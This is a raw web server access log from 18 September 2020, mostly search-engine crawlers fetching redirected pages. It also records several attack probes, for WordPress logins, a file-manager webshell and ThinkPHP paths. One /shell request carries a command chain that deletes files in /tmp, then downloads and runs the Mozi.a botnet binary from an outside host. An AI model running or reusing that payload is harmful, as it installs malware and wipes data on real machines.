62.210.143.6 - - [18/Sep/2020:15:29:30 +0100] "GET /dane/dane/prz2/pp1/ppp1.html HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:30 +0100] "GET /dane/dane/prz2/pp1/ppp1.html HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:35 +0100] "GET /dane/dane/prz9/foto/pan04.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:35 +0100] "GET /dane/dane/prz9/foto/pan04.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:40 +0100] "GET /dane/dane/prz9/foto/pan05.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:40 +0100] "GET /dane/dane/prz9/foto/pan05.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:45 +0100] "GET /dane/dane/prz2/dalej/p2a.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:45 +0100] "GET /dane/dane/prz2/dalej/p2a.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:50 +0100] "GET /dane/dane/prz6/brody/brody.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:50 +0100] "GET /dane/dane/prz6/brody/brody.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:55 +0100] "GET /dane/dane/prz6/sobkow/sob.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:29:55 +0100] "GET /dane/dane/prz6/sobkow/sob.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:00 +0100] "GET /dane/dane/prz4/pp10/pp10.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:00 +0100] "GET /dane/dane/prz4/pp10/pp10.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:05 +0100] "GET /dane/dane/prz4/pp11/pp11.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:05 +0100] "GET /dane/dane/prz4/pp11/pp11.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:10 +0100] "GET /dane/dane/prz4/pp13/pp13.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:10 +0100] "GET /dane/dane/prz4/pp13/pp13.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:15 +0100] "GET /dane/dane/prz3/pp14/pp14.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:16 +0100] "GET /dane/dane/prz3/pp14/pp14.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
185.191.171.34 - - [18/Sep/2020:15:30:19 +0100] "GET /dane/dane/prz2/dalej/pp25/foto/05.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
62.210.143.6 - - [18/Sep/2020:15:30:21 +0100] "GET /dane/dane/prz3/pp10/pp10.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:21 +0100] "GET /dane/dane/prz3/pp10/pp10.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:26 +0100] "GET /dane/dane/prz3/pp15/pp15.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:26 +0100] "GET /dane/dane/prz3/pp15/pp15.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:31 +0100] "GET /dane/dane/prz3/pp11/pp11.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:31 +0100] "GET /dane/dane/prz3/pp11/pp11.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:36 +0100] "GET /dane/dane/prz3/pp13/pp13.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:36 +0100] "GET /dane/dane/prz3/pp13/pp13.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:41 +0100] "GET /dane/dane/prz3/pp12/pp12.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:41 +0100] "GET /dane/dane/prz3/pp12/pp12.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:46 +0100] "GET /dane/dane/prz6/ilza/ilza.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:46 +0100] "GET /dane/dane/prz6/ilza/ilza.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:51 +0100] "GET /dane/dane/prz2/pp18/pp18.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:51 +0100] "GET /dane/dane/prz2/pp18/pp18.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:56 +0100] "GET /dane/dane/prz2/pp10/ppp10.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:30:56 +0100] "GET /dane/dane/prz2/pp10/ppp10.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:31:01 +0100] "GET /dane/dane/prz2/pp4/ppp4.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:31:01 +0100] "GET /dane/dane/prz2/pp4/ppp4.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:31:06 +0100] "GET /dane/dane/prz2/pp2/ppp2.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:31:07 +0100] "GET /dane/dane/prz2/pp2/ppp2.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:31:12 +0100] "GET /dane/dane/prz2/pp3/ppp3.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:31:12 +0100] "GET /dane/dane/prz2/pp3/ppp3.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:31:17 +0100] "GET /dane/dane/prz8/foto/foto01.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:31:17 +0100] "GET /dane/dane/prz8/foto/foto01.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:31:22 +0100] "GET /dane/dane/prz8/foto/foto27.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:31:22 +0100] "GET /dane/dane/prz8/foto/foto27.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:31:27 +0100] "GET /dane/dane/prz6/wodne/wodne.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:31:27 +0100] "GET /dane/dane/prz6/wodne/wodne.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:31:32 +0100] "GET /dane/dane/prz3/pp4/foto/foto08.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:31:32 +0100] "GET /dane/dane/prz3/pp4/foto/foto08.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:31:37 +0100] "GET /dane/dane/prz2/pp1/foto/foto15.html HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
62.210.143.6 - - [18/Sep/2020:15:31:37 +0100] "GET /dane/dane/prz2/pp1/foto/foto15.html HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
185.191.171.8 - - [18/Sep/2020:15:34:24 +0100] "GET /dane/dane/prz3/pp11/foto/ppp5.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
54.36.148.129 - - [18/Sep/2020:15:34:59 +0100] "GET /dane/dane/prz6/lopuszno/fotki/lop1.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.35 - - [18/Sep/2020:15:36:52 +0100] "GET /dane/dane/prz2/pp3/ppp3.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
194.146.24.53 - - [18/Sep/2020:15:37:24 +0100] "POST /wp-cron.php?doing_wp_cron=1600439844.7670660018920898437500 HTTP/1.1" 200 31 "http://ipmad.mztel.net/wp-cron.php?doing_wp_cron=1600439844.7670660018920898437500" "WordPress/5.5.1; https://ipmad.mztel.net"
185.85.239.110 - - [18/Sep/2020:15:37:24 +0100] "GET /wp-login.php HTTP/1.1" 404 18998 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
114.119.163.186 - - [18/Sep/2020:15:38:32 +0100] "GET /robots.txt HTTP/1.1" 301 185 "-" "(compatible;PetalBot;+https://aspiegel.com/petalbot)"
54.36.148.191 - - [18/Sep/2020:15:48:41 +0100] "GET /dane/dane/prz6/lopuszno/fotki/lop7.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
195.54.167.190 - - [18/Sep/2020:15:55:13 +0100] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
195.54.167.190 - - [18/Sep/2020:15:55:13 +0100] "" 400 0 "-" "-"
185.86.164.99 - - [18/Sep/2020:15:55:18 +0100] "GET /wp-login.php HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
114.119.157.96 - - [18/Sep/2020:15:58:34 +0100] "GET /dane/dane/prz6/rembow/mini08.JPG HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)"
185.191.171.12 - - [18/Sep/2020:15:59:40 +0100] "GET /dane/dane/prz2/dalej/pp27/foto/03.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
54.36.148.7 - - [18/Sep/2020:15:59:48 +0100] "GET /dane/dane/prz6/lopuszno/fotki/lop8.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.3 - - [18/Sep/2020:16:02:05 +0100] "GET /dane/dane/prz6/rytwiany/foto/foto01.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
114.119.138.111 - - [18/Sep/2020:16:10:16 +0100] "GET /robots.txt HTTP/1.1" 301 185 "-" "(compatible;PetalBot;+https://aspiegel.com/petalbot)"
45.146.164.186 - - [18/Sep/2020:16:10:18 +0100] "POST /api/jsonws/invoke HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
54.36.148.62 - - [18/Sep/2020:16:11:50 +0100] "GET /dane/dane/prz6/chroberz/foto/foto01.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
66.249.69.119 - - [18/Sep/2020:16:20:29 +0100] "GET /dane/dane/prz5/mini88.jpg HTTP/1.1" 301 185 "-" "Googlebot-Image/1.0"
185.191.171.15 - - [18/Sep/2020:16:20:33 +0100] "GET /robots.txt HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.191.171.9 - - [18/Sep/2020:16:20:35 +0100] "GET /dane/dane/prz7/foto/foto28.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
34.69.185.13 - - [18/Sep/2020:16:22:28 +0100] "GET /wp-content/plugins/wp-file-manager/lib/files/hardfork.php.suspected HTTP/1.1" 301 185 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
34.69.185.13 - - [18/Sep/2020:16:22:28 +0100] "GET /wp-content/plugins/wp-file-manager/lib/files/hardfork.php HTTP/1.1" 301 185 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
54.36.148.191 - - [18/Sep/2020:16:23:24 +0100] "GET /dane/dane/prz2/dalej/pp22/foto/foto07.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.140.217 - - [18/Sep/2020:16:24:31 +0100] "GET /dane/dane/prz8/p8.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)"
54.36.148.80 - - [18/Sep/2020:16:34:48 +0100] "GET /dane/dane/prz6/chroberz/foto/foto02.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.149.26 - - [18/Sep/2020:16:46:32 +0100] "GET /dane/dane/prz6/malogoszcz/malogoszcz.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.9 - - [18/Sep/2020:16:46:41 +0100] "GET /dane/dane/prz3/pp15/foto/p05.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.191.171.4 - - [18/Sep/2020:16:48:26 +0100] "GET /dane/dane/prz2/pp5/foto/foto03.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
114.119.134.192 - - [18/Sep/2020:16:53:48 +0100] "GET /robots.txt HTTP/1.1" 301 185 "-" "(compatible;PetalBot;+https://aspiegel.com/petalbot)"
185.191.171.21 - - [18/Sep/2020:16:54:19 +0100] "GET /dane/dane/prz2/dalej/pp23/foto/foto12.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
54.36.148.191 - - [18/Sep/2020:16:57:45 +0100] "GET /dane/dane/prz6/chroberz/foto/foto07.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
66.249.69.121 - - [18/Sep/2020:16:59:52 +0100] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
193.106.30.99 - - [18/Sep/2020:17:05:53 +0100] "HEAD / HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0"
54.36.148.69 - - [18/Sep/2020:17:09:30 +0100] "GET /dane/dane/prz2/dalej/pp22/foto/foto01.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.25 - - [18/Sep/2020:17:12:34 +0100] "GET /dane/dane/prz2/pp1/foto/foto01.html HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
114.119.128.89 - - [18/Sep/2020:17:14:18 +0100] "GET /dane/dane/prz7/p7.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)"
114.119.135.174 - - [18/Sep/2020:17:19:18 +0100] "GET /dane/dane/prz6/rembow/rembow.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)"
54.36.149.46 - - [18/Sep/2020:17:20:33 +0100] "GET /dane/dane/prz6/rembow/foto/foto5.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
117.67.129.246 - - [18/Sep/2020:17:24:17 +0100] "GET /TP/public/index.php HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
117.67.129.246 - - [18/Sep/2020:17:24:22 +0100] "GET /TP/index.php HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
117.67.129.246 - - [18/Sep/2020:17:24:24 +0100] "GET /thinkphp/html/public/index.php HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
117.67.129.246 - - [18/Sep/2020:17:24:30 +0100] "GET /html/public/index.php HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
117.67.129.246 - - [18/Sep/2020:17:24:32 +0100] "GET /public/index.php HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
117.67.129.246 - - [18/Sep/2020:17:24:38 +0100] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
54.36.148.90 - - [18/Sep/2020:17:32:13 +0100] "GET /dane/dane/prz6/malogoszcz/foto/zd01.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.3 - - [18/Sep/2020:17:35:05 +0100] "GET /robots.txt HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.191.171.5 - - [18/Sep/2020:17:35:05 +0100] "GET /dane/dane/prz3/pp13/foto/foto02.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.85.191.201 - - [18/Sep/2020:17:38:52 +0100] "GET /wp-login.php HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
62.210.83.78 - - [18/Sep/2020:17:40:54 +0100] "GET / HTTP/1.1" 301 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
185.191.171.19 - - [18/Sep/2020:17:41:26 +0100] "GET /dane/dane/prz6/stopnica/stopnica.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
114.119.128.89 - - [18/Sep/2020:17:41:41 +0100] "GET /dane/dane/prz6/opatow/mini03.JPG HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)"
54.36.148.191 - - [18/Sep/2020:17:43:21 +0100] "GET /dane/dane/prz6/malogoszcz/foto/zd02.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.19 - - [18/Sep/2020:17:44:51 +0100] "GET /dane/dane/prz6/wodne/pp2/foto/foto2.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
114.119.149.233 - - [18/Sep/2020:17:46:49 +0100] "GET /dane/dane/prz6/chroberz/mini09.JPG HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)"
185.191.171.3 - - [18/Sep/2020:17:48:57 +0100] "GET /dane/dane/prz3/pp6/foto/foto10.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
213.25.135.1 - - [18/Sep/2020:17:53:36 +0100] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.191.171.18 - - [18/Sep/2020:17:53:41 +0100] "GET /dane/dane/prz3/pp11/foto/ppp8.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
54.36.148.252 - - [18/Sep/2020:17:54:34 +0100] "GET /dane/dane/prz2/dalej/pp22/foto/foto02.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.3 - - [18/Sep/2020:17:54:53 +0100] "GET /dane/dane/prz5/foto/foto38.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
114.119.156.250 - - [18/Sep/2020:18:02:54 +0100] "GET /dane/dane/prz7/mini13a.JPG HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)"
54.36.148.17 - - [18/Sep/2020:18:06:06 +0100] "GET /robots.txt HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)"
54.36.148.191 - - [18/Sep/2020:18:06:06 +0100] "GET /dane/dane/prz6/malogoszcz/foto/zd08.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.191 - - [18/Sep/2020:18:17:00 +0100] "GET /dane/dane/prz6/szydlow/szydlow.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
115.98.190.186 - - [18/Sep/2020:18:27:00 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://115.98.190.186:40227/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 301 185 "-" "Hello, world"
34.76.17.151 - - [18/Sep/2020:18:47:08 +0100] "GET / HTTP/1.1" 301 185 "-" "python-requests/2.24.0"
185.191.171.5 - - [18/Sep/2020:18:51:17 +0100] "GET /robots.txt HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.191.171.1 - - [18/Sep/2020:18:51:18 +0100] "GET /dane/dane/prz4/pp11/foto/p05.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.191.171.18 - - [18/Sep/2020:19:08:02 +0100] "GET /dane/dane/prz2/dalej/pp26/foto/09.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
66.249.75.25 - - [18/Sep/2020:19:11:55 +0100] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
185.191.171.10 - - [18/Sep/2020:19:16:12 +0100] "GET /dane/dane/prz6/nietulisko/nietulisko.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.191.171.25 - - [18/Sep/2020:19:22:00 +0100] "GET /dane/dane/prz6/wislica/foto/foto12.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.191.171.9 - - [18/Sep/2020:19:23:39 +0100] "GET /dane/dane/prz7/foto/foto25.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
194.146.24.53 - - [18/Sep/2020:19:28:56 +0100] "POST /wp-cron.php?doing_wp_cron=1600453736.0761270523071289062500 HTTP/1.1" 200 31 "http://ipmad.mztel.net/wp-cron.php?doing_wp_cron=1600453736.0761270523071289062500" "WordPress/5.5.1; https://ipmad.mztel.net"
